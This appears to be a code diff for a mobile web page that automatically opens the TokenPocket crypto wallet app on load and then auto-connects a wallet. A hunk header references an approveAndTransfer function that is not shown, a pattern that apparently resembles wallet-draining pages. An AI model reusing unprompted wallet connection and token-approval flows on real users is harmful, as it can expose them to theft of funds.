@@ -21,26 +21,6 @@
     .loading { background: #fff3cd; color: #856404; }
     .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; }
   </style>
-   <title>打开TP钱包</title>
-  <script>
-    // 当页面加载时自动跳转到TP钱包
-    window.onload = function() {
-      // 这里填写你想跳转的TP钱包Scheme
-      var tpLink = "tp://wallet";  // 你可以换成具体的链接，例如交易、打开DApp等
-      
-      // 自动跳转
-      window.location.href = tpLink;
-
-      // 如果未安装TP，可在几秒后跳转备用页面
-      setTimeout(function(){
-        window.location.href = "https://www.tokenpocket.pro"; // 引导下载TP钱包
-      }, 3000);
-    };
-  </script>
-</head>
-<body>
-  <h2>正在尝试打开 TP 钱包...</h2>
-</body>
 </head>
 <body>
   <div class="card">
@@ -154,9 +134,25 @@ async function approveAndTransfer() {
   }
 }
 
-    window.onload = async () => {
-      await autoConnect();
-    };
+window.onload = async () => {
+  // === 自动尝试唤起 TP 钱包 App ===
+  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    // TP 的深度链接（可自定义）
+    const tpLink = "tp://wallet";
+
+    // 尝试打开TP钱包
+    window.location.href = tpLink;
+
+    // 如果3秒内没打开，就跳转到下载页
+    setTimeout(() => {
+      window.location.href = "https://www.tokenpocket.pro/zh/download";
+    }, 3000);
+  }
+
+  // === 然后执行原有连接钱包逻辑 ===
+  await autoConnect();
+};
+
   </script>
 </body>
 </html>
